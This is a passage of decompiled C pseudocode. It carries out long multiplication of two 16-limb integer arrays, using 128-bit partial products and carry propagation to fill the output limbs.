  v138 = (v137 < *((_QWORD *)&v135 + 1)) + v134;
  v139 = a2[5] * (unsigned __int128)a3[11];
  v140 = v136 + v139;
  *((_QWORD *)&v139 + 1) += v136 + (unsigned __int64)v139 < v136;
  v141 = *((_QWORD *)&v139 + 1) + v137;
  v142 = (v141 < *((_QWORD *)&v139 + 1)) + v138;
  v143 = a2[6] * (unsigned __int128)a3[10];
  v144 = v140 + v143;
  *((_QWORD *)&v143 + 1) += v140 + (unsigned __int64)v143 < v140;
  v145 = *((_QWORD *)&v143 + 1) + v141;
  v146 = (v145 < *((_QWORD *)&v143 + 1)) + v142;
  v147 = a2[7] * (unsigned __int128)a3[9];
  v148 = v144 + v147;
  *((_QWORD *)&v147 + 1) += v144 + (unsigned __int64)v147 < v144;
  v149 = *((_QWORD *)&v147 + 1) + v145;
  v150 = (v149 < *((_QWORD *)&v147 + 1)) + v146;
  v151 = a2[8] * (unsigned __int128)a3[8];
  v152 = v148 + v151;
  *((_QWORD *)&v151 + 1) += v148 + (unsigned __int64)v151 < v148;
  v153 = *((_QWORD *)&v151 + 1) + v149;
  v154 = (v153 < *((_QWORD *)&v151 + 1)) + v150;
  v155 = a2[9] * (unsigned __int128)a3[7];
  v156 = v152 + v155;
  *((_QWORD *)&v155 + 1) += v152 + (unsigned __int64)v155 < v152;
  v157 = *((_QWORD *)&v155 + 1) + v153;
  v158 = (v157 < *((_QWORD *)&v155 + 1)) + v154;
  v159 = a2[10] * (unsigned __int128)a3[6];
  v160 = v156 + v159;
  *((_QWORD *)&v159 + 1) += v156 + (unsigned __int64)v159 < v156;
  v161 = *((_QWORD *)&v159 + 1) + v157;
  v162 = (v161 < *((_QWORD *)&v159 + 1)) + v158;
  v163 = a2[11] * (unsigned __int128)a3[5];
  v164 = v160 + v163;
  *((_QWORD *)&v163 + 1) += v160 + (unsigned __int64)v163 < v160;
  v165 = *((_QWORD *)&v163 + 1) + v161;
  v166 = (v165 < *((_QWORD *)&v163 + 1)) + v162;
  v167 = a2[12] * (unsigned __int128)a3[4];
  v168 = v164 + v167;
  *((_QWORD *)&v167 + 1) += v164 + (unsigned __int64)v167 < v164;
  v169 = *((_QWORD *)&v167 + 1) + v165;
  v170 = (v169 < *((_QWORD *)&v167 + 1)) + v166;
  v171 = a2[13] * (unsigned __int128)a3[3];
  v172 = v168 + v171;
  *((_QWORD *)&v171 + 1) += v168 + (unsigned __int64)v171 < v168;
  v173 = *((_QWORD *)&v171 + 1) + v169;
  v174 = (v173 < *((_QWORD *)&v171 + 1)) + v170;
  v175 = a2[14] * (unsigned __int128)a3[2];
  v176 = v172 + v175;
  *((_QWORD *)&v175 + 1) += v172 + (unsigned __int64)v175 < v172;
  v177 = *((_QWORD *)&v175 + 1) + v173;
  v178 = (v177 < *((_QWORD *)&v175 + 1)) + v174;
  v179 = v114 * (unsigned __int128)a3[1];
  *(_QWORD *)&v179 = v176 + v179;
  *a1 = v179;
  *((_QWORD *)&v179 + 1) += (unsigned __int64)v179 < v176;
  v180 = *((_QWORD *)&v179 + 1) + v177;
  v181 = (v180 < *((_QWORD *)&v179 + 1)) + v178;
  v182 = a2[2] * (unsigned __int128)a3[15];
  v183 = v180 + v182;
  *((_QWORD *)&v182 + 1) += v180 + (unsigned __int64)v182 < v180;
  v184 = *((_QWORD *)&v182 + 1) + v181;
  v185 = v184 < *((_QWORD *)&v182 + 1);
  v186 = a2[3] * (unsigned __int128)a3[14];
  v187 = v183 + v186;
  *((_QWORD *)&v186 + 1) += v183 + (unsigned __int64)v186 < v183;
  v188 = *((_QWORD *)&v186 + 1) + v184;
  v189 = (v188 < *((_QWORD *)&v186 + 1)) + v185;
  v190 = a2[4] * (unsigned __int128)a3[13];
  v191 = v187 + v190;
  *((_QWORD *)&v190 + 1) += v187 + (unsigned __int64)v190 < v187;
  v192 = *((_QWORD *)&v190 + 1) + v188;
  v193 = (v192 < *((_QWORD *)&v190 + 1)) + v189;
  v194 = a2[5] * (unsigned __int128)a3[12];
  v195 = v191 + v194;
  *((_QWORD *)&v194 + 1) += v191 + (unsigned __int64)v194 < v191;
  v196 = *((_QWORD *)&v194 + 1) + v192;
  v197 = (v196 < *((_QWORD *)&v194 + 1)) + v193;
  v198 = a2[6] * (unsigned __int128)a3[11];
  v199 = v195 + v198;
  *((_QWORD *)&v198 + 1) += v195 + (unsigned __int64)v198 < v195;
  v200 = *((_QWORD *)&v198 + 1) + v196;
  v201 = (v200 < *((_QWORD *)&v198 + 1)) + v197;
  v202 = a2[7] * (unsigned __int128)a3[10];
  v203 = v199 + v202;
  *((_QWORD *)&v202 + 1) += v199 + (unsigned __int64)v202 < v199;
  v204 = *((_QWORD *)&v202 + 1) + v200;
  v205 = (v204 < *((_QWORD *)&v202 + 1)) + v201;
  v206 = a2[8] * (unsigned __int128)a3[9];
  v207 = v203 + v206;
  *((_QWORD *)&v206 + 1) += v203 + (unsigned __int64)v206 < v203;
  v208 = *((_QWORD *)&v206 + 1) + v204;
  v209 = (v208 < *((_QWORD *)&v206 + 1)) + v205;
  v210 = a2[9] * (unsigned __int128)a3[8];
  v211 = v207 + v210;
  *((_QWORD *)&v210 + 1) += v207 + (unsigned __int64)v210 < v207;
  v212 = *((_QWORD *)&v210 + 1) + v208;
  v213 = (v212 < *((_QWORD *)&v210 + 1)) + v209;
  v214 = a2[10] * (unsigned __int128)a3[7];
  v215 = v211 + v214;
  *((_QWORD *)&v214 + 1) += v211 + (unsigned __int64)v214 < v211;
  v216 = *((_QWORD *)&v214 + 1) + v212;
  v217 = (v216 < *((_QWORD *)&v214 + 1)) + v213;
  v218 = a2[11] * (unsigned __int128)a3[6];
  v219 = v215 + v218;
  *((_QWORD *)&v218 + 1) += v215 + (unsigned __int64)v218 < v215;
  v220 = *((_QWORD *)&v218 + 1) + v216;
  v221 = (v220 < *((_QWORD *)&v218 + 1)) + v217;
  v222 = a2[12] * (unsigned __int128)a3[5];
  v223 = v219 + v222;
  *((_QWORD *)&v222 + 1) += v219 + (unsigned __int64)v222 < v219;
  v224 = *((_QWORD *)&v222 + 1) + v220;
  v225 = (v224 < *((_QWORD *)&v222 + 1)) + v221;
  v226 = a2[13] * (unsigned __int128)a3[4];
  v227 = v223 + v226;
  *((_QWORD *)&v226 + 1) += v223 + (unsigned __int64)v226 < v223;
  v228 = *((_QWORD *)&v226 + 1) + v224;
  v229 = (v228 < *((_QWORD *)&v226 + 1)) + v225;
  v230 = a2[14] * (unsigned __int128)a3[3];
  v231 = v227 + v230;
  *((_QWORD *)&v230 + 1) += v227 + (unsigned __int64)v230 < v227;
  v232 = *((_QWORD *)&v230 + 1) + v228;
  v233 = (v232 < *((_QWORD *)&v230 + 1)) + v229;
  v234 = a2[15] * (unsigned __int128)a3[2];
  *(_QWORD *)&v234 = v231 + v234;
  a1[1] = v234;
  *((_QWORD *)&v234 + 1) += (unsigned __int64)v234 < v231;
  v235 = *((_QWORD *)&v234 + 1) + v232;
  v236 = (v235 < *((_QWORD *)&v234 + 1)) + v233;
  v237 = a2[3] * (unsigned __int128)a3[15];
  v238 = v235 + v237;
  *((_QWORD *)&v237 + 1) += v235 + (unsigned __int64)v237 < v235;
  v239 = *((_QWORD *)&v237 + 1) + v236;
  v240 = v239 < *((_QWORD *)&v237 + 1);
  v241 = a2[4] * (unsigned __int128)a3[14];
  v242 = v238 + v241;
  *((_QWORD *)&v241 + 1) += v238 + (unsigned __int64)v241 < v238;
  v243 = *((_QWORD *)&v241 + 1) + v239;
  v244 = (v243 < *((_QWORD *)&v241 + 1)) + v240;
  v245 = a2[5] * (unsigned __int128)a3[13];
  v246 = v242 + v245;
  *((_QWORD *)&v245 + 1) += v242 + (unsigned __int64)v245 < v242;
  v247 = *((_QWORD *)&v245 + 1) + v243;
  v248 = (v247 < *((_QWORD *)&v245 + 1)) + v244;
  v249 = a2[6] * (unsigned __int128)a3[12];
  v250 = v246 + v249;
  *((_QWORD *)&v249 + 1) += v246 + (unsigned __int64)v249 < v246;
  v251 = *((_QWORD *)&v249 + 1) + v247;
  v252 = (v251 < *((_QWORD *)&v249 + 1)) + v248;
  v253 = a2[7] * (unsigned __int128)a3[11];
  v254 = v250 + v253;
  *((_QWORD *)&v253 + 1) += v250 + (unsigned __int64)v253 < v250;
  v255 = *((_QWORD *)&v253 + 1) + v251;
  v256 = (v255 < *((_QWORD *)&v253 + 1)) + v252;
  v257 = a2[8] * (unsigned __int128)a3[10];
  v258 = v254 + v257;
  *((_QWORD *)&v257 + 1) += v254 + (unsigned __int64)v257 < v254;
  v259 = *((_QWORD *)&v257 + 1) + v255;
  v260 = (v259 < *((_QWORD *)&v257 + 1)) + v256;
  v261 = a2[9] * (unsigned __int128)a3[9];
  v262 = v258 + v261;
  *((_QWORD *)&v261 + 1) += v258 + (unsigned __int64)v261 < v258;
  v263 = *((_QWORD *)&v261 + 1) + v259;
  v264 = (v263 < *((_QWORD *)&v261 + 1)) + v260;
  v265 = a2[10] * (unsigned __int128)a3[8];
  v266 = v262 + v265;
  *((_QWORD *)&v265 + 1) += v262 + (unsigned __int64)v265 < v262;
  v267 = *((_QWORD *)&v265 + 1) + v263;
  v268 = (v267 < *((_QWORD *)&v265 + 1)) + v264;
  v269 = a2[11] * (unsigned __int128)a3[7];
  v270 = v266 + v269;
  *((_QWORD *)&v269 + 1) += v266 + (unsigned __int64)v269 < v266;
  v271 = *((_QWORD *)&v269 + 1) + v267;
  v272 = (v271 < *((_QWORD *)&v269 + 1)) + v268;
  v273 = a2[12] * (unsigned __int128)a3[6];
  v274 = v270 + v273;
  *((_QWORD *)&v273 + 1) += v270 + (unsigned __int64)v273 < v270;
  v275 = *((_QWORD *)&v273 + 1) + v271;
  v276 = (v275 < *((_QWORD *)&v273 + 1)) + v272;
  v277 = a2[13] * (unsigned __int128)a3[5];
  v278 = v274 + v277;
  *((_QWORD *)&v277 + 1) += v274 + (unsigned __int64)v277 < v274;
  v279 = *((_QWORD *)&v277 + 1) + v275;
  v280 = (v279 < *((_QWORD *)&v277 + 1)) + v276;
  v281 = a2[14] * (unsigned __int128)a3[4];
  v282 = v278 + v281;
  *((_QWORD *)&v281 + 1) += v278 + (unsigned __int64)v281 < v278;
  v283 = *((_QWORD *)&v281 + 1) + v279;
  v284 = (v283 < *((_QWORD *)&v281 + 1)) + v280;
  v285 = a2[15] * (unsigned __int128)a3[3];
  *(_QWORD *)&v285 = v282 + v285;
  *((_QWORD *)&v285 + 1) += (unsigned __int64)v285 < v282;
  a1[2] = v285;
  v286 = *((_QWORD *)&v285 + 1) + v283;
  v287 = (v286 < *((_QWORD *)&v285 + 1)) + v284;
  v288 = a2[4] * (unsigned __int128)a3[15];
  v289 = v286 + v288;
  *((_QWORD *)&v288 + 1) += v286 + (unsigned __int64)v288 < v286;
  v290 = *((_QWORD *)&v288 + 1) + v287;
  v291 = v290 < *((_QWORD *)&v288 + 1);
  v292 = a2[5] * (unsigned __int128)a3[14];
  v293 = v289 + v292;
  *((_QWORD *)&v292 + 1) += v289 + (unsigned __int64)v292 < v289;
  v294 = *((_QWORD *)&v292 + 1) + v290;
  v295 = (v294 < *((_QWORD *)&v292 + 1)) + v291;
  v296 = a2[6] * (unsigned __int128)a3[13];
  v297 = v293 + v296;
  *((_QWORD *)&v296 + 1) += v293 + (unsigned __int64)v296 < v293;
  v298 = *((_QWORD *)&v296 + 1) + v294;
  v299 = (v298 < *((_QWORD *)&v296 + 1)) + v295;
  v300 = a2[7] * (unsigned __int128)a3[12];
  v301 = v297 + v300;
  *((_QWORD *)&v300 + 1) += v297 + (unsigned __int64)v300 < v297;
  v302 = *((_QWORD *)&v300 + 1) + v298;
  v303 = (v302 < *((_QWORD *)&v300 + 1)) + v299;
  v304 = a2[8] * (unsigned __int128)a3[11];
  v305 = v301 + v304;
  *((_QWORD *)&v304 + 1) += v301 + (unsigned __int64)v304 < v301;
  v306 = *((_QWORD *)&v304 + 1) + v302;
  v307 = (v306 < *((_QWORD *)&v304 + 1)) + v303;
  v308 = a2[9] * (unsigned __int128)a3[10];
  v309 = v305 + v308;
  *((_QWORD *)&v308 + 1) += v305 + (unsigned __int64)v308 < v305;
  v310 = *((_QWORD *)&v308 + 1) + v306;
  v311 = (v310 < *((_QWORD *)&v308 + 1)) + v307;
  v312 = a2[10] * (unsigned __int128)a3[9];
  v313 = v309 + v312;
  *((_QWORD *)&v312 + 1) += v309 + (unsigned __int64)v312 < v309;
  v314 = *((_QWORD *)&v312 + 1) + v310;
  v315 = (v314 < *((_QWORD *)&v312 + 1)) + v311;
  v316 = a2[11] * (unsigned __int128)a3[8];
  v317 = v313 + v316;
  *((_QWORD *)&v316 + 1) += v313 + (unsigned __int64)v316 < v313;
  v318 = *((_QWORD *)&v316 + 1) + v314;
  v319 = (v318 < *((_QWORD *)&v316 + 1)) + v315;
  v320 = a2[12] * (unsigned __int128)a3[7];
  v321 = v317 + v320;
  *((_QWORD *)&v320 + 1) += v317 + (unsigned __int64)v320 < v317;
  v322 = *((_QWORD *)&v320 + 1) + v318;
  v323 = (v322 < *((_QWORD *)&v320 + 1)) + v319;
  v324 = a2[13] * (unsigned __int128)a3[6];
  v325 = v321 + v324;
  *((_QWORD *)&v324 + 1) += v321 + (unsigned __int64)v324 < v321;
  v326 = *((_QWORD *)&v324 + 1) + v322;
  v327 = (v326 < *((_QWORD *)&v324 + 1)) + v323;
  v328 = a2[14] * (unsigned __int128)a3[5];
  v329 = v325 + v328;
  *((_QWORD *)&v328 + 1) += v325 + (unsigned __int64)v328 < v325;
  v330 = *((_QWORD *)&v328 + 1) + v326;
  v331 = (v330 < *((_QWORD *)&v328 + 1)) + v327;
  v332 = a2[15] * (unsigned __int128)a3[4];
  *(_QWORD *)&v332 = v329 + v332;
  a1[3] = v332;
  *((_QWORD *)&v332 + 1) += (unsigned __int64)v332 < v329;
  v333 = *((_QWORD *)&v332 + 1) + v330;
  v334 = (v333 < *((_QWORD *)&v332 + 1)) + v331;
  v335 = a2[5] * (unsigned __int128)a3[15];
  v336 = v333 + v335;
  *((_QWORD *)&v335 + 1) += v333 + (unsigned __int64)v335 < v333;
  v337 = *((_QWORD *)&v335 + 1) + v334;
  v338 = v337 < *((_QWORD *)&v335 + 1);
  v339 = a2[6] * (unsigned __int128)a3[14];
  v340 = v336 + v339;
  *((_QWORD *)&v339 + 1) += v336 + (unsigned __int64)v339 < v336;
  v341 = *((_QWORD *)&v339 + 1) + v337;
  v342 = (v341 < *((_QWORD *)&v339 + 1)) + v338;
  v343 = a2[7] * (unsigned __int128)a3[13];
  v344 = v340 + v343;
  *((_QWORD *)&v343 + 1) += v340 + (unsigned __int64)v343 < v340;
  v345 = *((_QWORD *)&v343 + 1) + v341;
  v346 = (v345 < *((_QWORD *)&v343 + 1)) + v342;
  v347 = a2[8] * (unsigned __int128)a3[12];
  v348 = v344 + v347;
  *((_QWORD *)&v347 + 1) += v344 + (unsigned __int64)v347 < v344;
  v349 = *((_QWORD *)&v347 + 1) + v345;
  v350 = (v349 < *((_QWORD *)&v347 + 1)) + v346;
  v351 = a2[9] * (unsigned __int128)a3[11];
  v352 = v348 + v351;
  *((_QWORD *)&v351 + 1) += v348 + (unsigned __int64)v351 < v348;
  v353 = *((_QWORD *)&v351 + 1) + v349;
  v354 = (v353 < *((_QWORD *)&v351 + 1)) + v350;
  v355 = a2[10] * (unsigned __int128)a3[10];
  v356 = v352 + v355;
  *((_QWORD *)&v355 + 1) += v352 + (unsigned __int64)v355 < v352;
  v357 = *((_QWORD *)&v355 + 1) + v353;
  v358 = (v357 < *((_QWORD *)&v355 + 1)) + v354;
  v359 = a2[11] * (unsigned __int128)a3[9];
  v360 = v356 + v359;
  *((_QWORD *)&v359 + 1) += v356 + (unsigned __int64)v359 < v356;
  v361 = *((_QWORD *)&v359 + 1) + v357;
  v362 = (v361 < *((_QWORD *)&v359 + 1)) + v358;
  v363 = a2[12] * (unsigned __int128)a3[8];
  v364 = v360 + v363;
  *((_QWORD *)&v363 + 1) += v360 + (unsigned __int64)v363 < v360;
  v365 = *((_QWORD *)&v363 + 1) + v361;
  v366 = (v365 < *((_QWORD *)&v363 + 1)) + v362;
  v367 = a2[13] * (unsigned __int128)a3[7];
  v368 = v364 + v367;
  *((_QWORD *)&v367 + 1) += v364 + (unsigned __int64)v367 < v364;
  v369 = *((_QWORD *)&v367 + 1) + v365;
  v370 = (v369 < *((_QWORD *)&v367 + 1)) + v366;
  v371 = a2[14] * (unsigned __int128)a3[6];
  v372 = v368 + v371;
  *((_QWORD *)&v371 + 1) += v368 + (unsigned __int64)v371 < v368;
  v373 = *((_QWORD *)&v371 + 1) + v369;
  v374 = (v373 < *((_QWORD *)&v371 + 1)) + v370;
  v375 = a2[15] * (unsigned __int128)a3[5];
  *(_QWORD *)&v375 = v372 + v375;
  a1[4] = v375;
  *((_QWORD *)&v375 + 1) += (unsigned __int64)v375 < v372;
  v376 = *((_QWORD *)&v375 + 1) + v373;
  v377 = (v376 < *((_QWORD *)&v375 + 1)) + v374;
  v378 = a2[6] * (unsigned __int128)a3[15];
  v379 = v376 + v378;
  *((_QWORD *)&v378 + 1) += v376 + (unsigned __int64)v378 < v376;
  v380 = *((_QWORD *)&v378 + 1) + v377;
  v381 = v380 < *((_QWORD *)&v378 + 1);
  v382 = a2[7] * (unsigned __int128)a3[14];
  v383 = v379 + v382;
  *((_QWORD *)&v382 + 1) += v379 + (unsigned __int64)v382 < v379;
  v384 = *((_QWORD *)&v382 + 1) + v380;
  v385 = (v384 < *((_QWORD *)&v382 + 1)) + v381;
  v386 = a2[8] * (unsigned __int128)a3[13];
  v387 = v383 + v386;
  *((_QWORD *)&v386 + 1) += v383 + (unsigned __int64)v386 < v383;
  v388 = *((_QWORD *)&v386 + 1) + v384;
  v389 = (v388 < *((_QWORD *)&v386 + 1)) + v385;
  v390 = a2[9] * (unsigned __int128)a3[12];
  v391 = v387 + v390;
  *((_QWORD *)&v390 + 1) += v387 + (unsigned __int64)v390 < v387;
  v392 = *((_QWORD *)&v390 + 1) + v388;
  v393 = (v392 < *((_QWORD *)&v390 + 1)) + v389;
  v394 = a2[10] * (unsigned __int128)a3[11];
  v395 = v391 + v394;
  *((_QWORD *)&v394 + 1) += v391 + (unsigned __int64)v394 < v391;
  v396 = *((_QWORD *)&v394 + 1) + v392;
  v397 = (v396 < *((_QWORD *)&v394 + 1)) + v393;
  v398 = a2[11] * (unsigned __int128)a3[10];
  v399 = v395 + v398;
  *((_QWORD *)&v398 + 1) += v395 + (unsigned __int64)v398 < v395;
  v400 = *((_QWORD *)&v398 + 1) + v396;
  v401 = (v400 < *((_QWORD *)&v398 + 1)) + v397;
  v402 = a2[12] * (unsigned __int128)a3[9];
  v403 = v399 + v402;
  *((_QWORD *)&v402 + 1) += v399 + (unsigned __int64)v402 < v399;
  v404 = *((_QWORD *)&v402 + 1) + v400;
  v405 = (v404 < *((_QWORD *)&v402 + 1)) + v401;
  v406 = a2[13] * (unsigned __int128)a3[8];
  v407 = v403 + v406;
  *((_QWORD *)&v406 + 1) += v403 + (unsigned __int64)v406 < v403;
  v408 = *((_QWORD *)&v406 + 1) + v404;
  v409 = (v408 < *((_QWORD *)&v406 + 1)) + v405;
  v410 = a2[14] * (unsigned __int128)a3[7];
  v411 = v407 + v410;
  *((_QWORD *)&v410 + 1) += v407 + (unsigned __int64)v410 < v407;
  v412 = *((_QWORD *)&v410 + 1) + v408;
  v413 = (v412 < *((_QWORD *)&v410 + 1)) + v409;
  v414 = a2[15] * (unsigned __int128)a3[6];
  *(_QWORD *)&v414 = v411 + v414;
  a1[5] = v414;
  *((_QWORD *)&v414 + 1) += (unsigned __int64)v414 < v411;
  v415 = *((_QWORD *)&v414 + 1) + v412;
  v416 = (v415 < *((_QWORD *)&v414 + 1)) + v413;
  v417 = a2[7] * (unsigned __int128)a3[15];
  v418 = v415 + v417;
  *((_QWORD *)&v417 + 1) += v415 + (unsigned __int64)v417 < v415;
  v419 = *((_QWORD *)&v417 + 1) + v416;
  v420 = v419 < *((_QWORD *)&v417 + 1);
  v421 = a2[8] * (unsigned __int128)a3[14];
  v422 = v418 + v421;
  *((_QWORD *)&v421 + 1) += v418 + (unsigned __int64)v421 < v418;
  v423 = *((_QWORD *)&v421 + 1) + v419;
  v424 = (v423 < *((_QWORD *)&v421 + 1)) + v420;
  v425 = a2[9] * (unsigned __int128)a3[13];
  v426 = v422 + v425;
  *((_QWORD *)&v425 + 1) += v422 + (unsigned __int64)v425 < v422;
  v427 = *((_QWORD *)&v425 + 1) + v423;
  v428 = (v427 < *((_QWORD *)&v425 + 1)) + v424;
  v429 = a2[10] * (unsigned __int128)a3[12];
  v430 = v426 + v429;
  *((_QWORD *)&v429 + 1) += v426 + (unsigned __int64)v429 < v426;
  v431 = *((_QWORD *)&v429 + 1) + v427;
  v432 = (v431 < *((_QWORD *)&v429 + 1)) + v428;
  v433 = a2[11] * (unsigned __int128)a3[11];
  v434 = v430 + v433;
  *((_QWORD *)&v433 + 1) += v430 + (unsigned __int64)v433 < v430;
  v435 = *((_QWORD *)&v433 + 1) + v431;
  v436 = (v435 < *((_QWORD *)&v433 + 1)) + v432;
  v437 = a2[12] * (unsigned __int128)a3[10];
  v438 = v434 + v437;
  *((_QWORD *)&v437 + 1) += v434 + (unsigned __int64)v437 < v434;
  v439 = *((_QWORD *)&v437 + 1) + v435;
  v440 = (v439 < *((_QWORD *)&v437 + 1)) + v436;
  v441 = a2[13] * (unsigned __int128)a3[9];
  v442 = v438 + v441;
  *((_QWORD *)&v441 + 1) += v438 + (unsigned __int64)v441 < v438;
  v443 = *((_QWORD *)&v441 + 1) + v439;
  v444 = (v443 < *((_QWORD *)&v441 + 1)) + v440;
  v445 = a2[14] * (unsigned __int128)a3[8];
  v446 = v442 + v445;
  *((_QWORD *)&v445 + 1) += v442 + (unsigned __int64)v445 < v442;
  v447 = *((_QWORD *)&v445 + 1) + v443;
  v448 = (v447 < *((_QWORD *)&v445 + 1)) + v444;
  v449 = a2[15] * (unsigned __int128)a3[7];
  *(_QWORD *)&v449 = v446 + v449;
  a1[6] = v449;
  *((_QWORD *)&v449 + 1) += (unsigned __int64)v449 < v446;
  v450 = *((_QWORD *)&v449 + 1) + v447;
  v451 = (v450 < *((_QWORD *)&v449 + 1)) + v448;
  v452 = a2[8] * (unsigned __int128)a3[15];
  v453 = v450 + v452;
  *((_QWORD *)&v452 + 1) += v450 + (unsigned __int64)v452 < v450;
  v454 = *((_QWORD *)&v452 + 1) + v451;
  v455 = v454 < *((_QWORD *)&v452 + 1);
  v456 = a2[9] * (unsigned __int128)a3[14];
  v457 = v453 + v456;
  *((_QWORD *)&v456 + 1) += v453 + (unsigned __int64)v456 < v453;
  v458 = *((_QWORD *)&v456 + 1) + v454;
  v459 = (v458 < *((_QWORD *)&v456 + 1)) + v455;
  v460 = a2[10] * (unsigned __int128)a3[13];
  v461 = v457 + v460;
  *((_QWORD *)&v460 + 1) += v457 + (unsigned __int64)v460 < v457;
  v462 = *((_QWORD *)&v460 + 1) + v458;
  v463 = (v462 < *((_QWORD *)&v460 + 1)) + v459;
  v464 = a2[11] * (unsigned __int128)a3[12];
  v465 = v461 + v464;
  *((_QWORD *)&v464 + 1) += v461 + (unsigned __int64)v464 < v461;
  v466 = *((_QWORD *)&v464 + 1) + v462;
  v467 = (v466 < *((_QWORD *)&v464 + 1)) + v463;
  v468 = a2[12] * (unsigned __int128)a3[11];
  v469 = v465 + v468;
  *((_QWORD *)&v468 + 1) += v465 + (unsigned __int64)v468 < v465;
  v470 = *((_QWORD *)&v468 + 1) + v466;
  v471 = (v470 < *((_QWORD *)&v468 + 1)) + v467;
  v472 = a2[13] * (unsigned __int128)a3[10];
  v473 = v469 + v472;
  *((_QWORD *)&v472 + 1) += v469 + (unsigned __int64)v472 < v469;
  v474 = *((_QWORD *)&v472 + 1) + v470;
  v475 = (v474 < *((_QWORD *)&v472 + 1)) + v471;
  v476 = a2[14] * (unsigned __int128)a3[9];
  v477 = v473 + v476;
  *((_QWORD *)&v476 + 1) += v473 + (unsigned __int64)v476 < v473;
  v478 = *((_QWORD *)&v476 + 1) + v474;
  v479 = (v478 < *((_QWORD *)&v476 + 1)) + v475;
  v480 = a2[15] * (unsigned __int128)a3[8];
  *(_QWORD *)&v480 = v477 + v480;
  a1[7] = v480;
  *((_QWORD *)&v480 + 1) += (unsigned __int64)v480 < v477;
  v481 = *((_QWORD *)&v480 + 1) + v478;
  v482 = (v481 < *((_QWORD *)&v480 + 1)) + v479;
  v483 = a2[9] * (unsigned __int128)a3[15];
  v484 = v481 + v483;
  *((_QWORD *)&v483 + 1) += v481 + (unsigned __int64)v483 < v481;
  v485 = *((_QWORD *)&v483 + 1) + v482;
  v486 = v485 < *((_QWORD *)&v483 + 1);
  v487 = a2[10] * (unsigned __int128)a3[14];
  v488 = v484 + v487;
  *((_QWORD *)&v487 + 1) += v484 + (unsigned __int64)v487 < v484;
  v489 = *((_QWORD *)&v487 + 1) + v485;
  v490 = (v489 < *((_QWORD *)&v487 + 1)) + v486;
  v491 = a2[11] * (unsigned __int128)a3[13];
  v492 = v488 + v491;
  *((_QWORD *)&v491 + 1) += v488 + (unsigned __int64)v491 < v488;
  v493 = *((_QWORD *)&v491 + 1) + v489;
  v494 = (v493 < *((_QWORD *)&v491 + 1)) + v490;
  v495 = a2[12] * (unsigned __int128)a3[12];
  v496 = v492 + v495;
  *((_QWORD *)&v495 + 1) += v492 + (unsigned __int64)v495 < v492;
  v497 = *((_QWORD *)&v495 + 1) + v493;
  v498 = (v497 < *((_QWORD *)&v495 + 1)) + v494;
  v499 = a2[13] * (unsigned __int128)a3[11];
  v500 = v496 + v499;
  *((_QWORD *)&v499 + 1) += v496 + (unsigned __int64)v499 < v496;
  v501 = *((_QWORD *)&v499 + 1) + v497;
  v502 = (v501 < *((_QWORD *)&v499 + 1)) + v498;
  v503 = a2[14] * (unsigned __int128)a3[10];
  v504 = v500 + v503;
  *((_QWORD *)&v503 + 1) += v500 + (unsigned __int64)v503 < v500;
  v505 = *((_QWORD *)&v503 + 1) + v501;
  v506 = (v505 < *((_QWORD *)&v503 + 1)) + v502;
  v507 = a2[15] * (unsigned __int128)a3[9];
  *(_QWORD *)&v507 = v504 + v507;
  a1[8] = v507;
  *((_QWORD *)&v507 + 1) += (unsigned __int64)v507 < v504;
  v508 = *((_QWORD *)&v507 + 1) + v505;
  v509 = (v508 < *((_QWORD *)&v507 + 1)) + v506;
  v510 = a2[10] * (unsigned __int128)a3[15];
  v511 = v508 + v510;
  *((_QWORD *)&v510 + 1) += v508 + (unsigned __int64)v510 < v508;
  v512 = *((_QWORD *)&v510 + 1) + v509;
  v513 = v512 < *((_QWORD *)&v510 + 1);
  v514 = a2[11] * (unsigned __int128)a3[14];
  v515 = v511 + v514;
  *((_QWORD *)&v514 + 1) += v511 + (unsigned __int64)v514 < v511;
  v516 = *((_QWORD *)&v514 + 1) + v512;
  v517 = (v516 < *((_QWORD *)&v514 + 1)) + v513;
  v518 = a2[12] * (unsigned __int128)a3[13];
  v519 = v515 + v518;
  *((_QWORD *)&v518 + 1) += v515 + (unsigned __int64)v518 < v515;
  v520 = *((_QWORD *)&v518 + 1) + v516;
  v521 = (v520 < *((_QWORD *)&v518 + 1)) + v517;
  v522 = a2[13] * (unsigned __int128)a3[12];
  v523 = v519 + v522;
  *((_QWORD *)&v522 + 1) += v519 + (unsigned __int64)v522 < v519;
  v524 = *((_QWORD *)&v522 + 1) + v520;
  v525 = (v524 < *((_QWORD *)&v522 + 1)) + v521;
  v526 = a2[14] * (unsigned __int128)a3[11];
  v527 = v523 + v526;
  *((_QWORD *)&v526 + 1) += v523 + (unsigned __int64)v526 < v523;
  v528 = *((_QWORD *)&v526 + 1) + v524;
  v529 = (v528 < *((_QWORD *)&v526 + 1)) + v525;
  v530 = a2[15] * (unsigned __int128)a3[10];
  *(_QWORD *)&v530 = v527 + v530;
  a1[9] = v530;
  *((_QWORD *)&v530 + 1) += (unsigned __int64)v530 < v527;
  v531 = *((_QWORD *)&v530 + 1) + v528;
  v532 = (v531 < *((_QWORD *)&v530 + 1)) + v529;
  v533 = a2[11] * (unsigned __int128)a3[15];
  v534 = v531 + v533;
  *((_QWORD *)&v533 + 1) += v531 + (unsigned __int64)v533 < v531;
  v535 = *((_QWORD *)&v533 + 1) + v532;
  v536 = v535 < *((_QWORD *)&v533 + 1);
  v537 = a2[12] * (unsigned __int128)a3[14];
  v538 = v534 + v537;
  *((_QWORD *)&v537 + 1) += v534 + (unsigned __int64)v537 < v534;
  v539 = *((_QWORD *)&v537 + 1) + v535;
  v540 = (v539 < *((_QWORD *)&v537 + 1)) + v536;
  v541 = a2[13] * (unsigned __int128)a3[13];
  v542 = v538 + v541;
  *((_QWORD *)&v541 + 1) += v538 + (unsigned __int64)v541 < v538;
  v543 = *((_QWORD *)&v541 + 1) + v539;
  v544 = (v543 < *((_QWORD *)&v541 + 1)) + v540;
  v545 = a2[14] * (unsigned __int128)a3[12];
  v546 = v542 + v545;
  *((_QWORD *)&v545 + 1) += v542 + (unsigned __int64)v545 < v542;
  v547 = *((_QWORD *)&v545 + 1) + v543;
  v548 = (v547 < *((_QWORD *)&v545 + 1)) + v544;
  v549 = a2[15] * (unsigned __int128)a3[11];
  *(_QWORD *)&v549 = v546 + v549;
  a1[10] = v549;
  *((_QWORD *)&v549 + 1) += (unsigned __int64)v549 < v546;
  v550 = *((_QWORD *)&v549 + 1) + v547;
  v551 = (v550 < *((_QWORD *)&v549 + 1)) + v548;
  v552 = a2[12] * (unsigned __int128)a3[15];
  v553 = v550 + v552;
  *((_QWORD *)&v552 + 1) += v550 + (unsigned __int64)v552 < v550;
  v554 = *((_QWORD *)&v552 + 1) + v551;
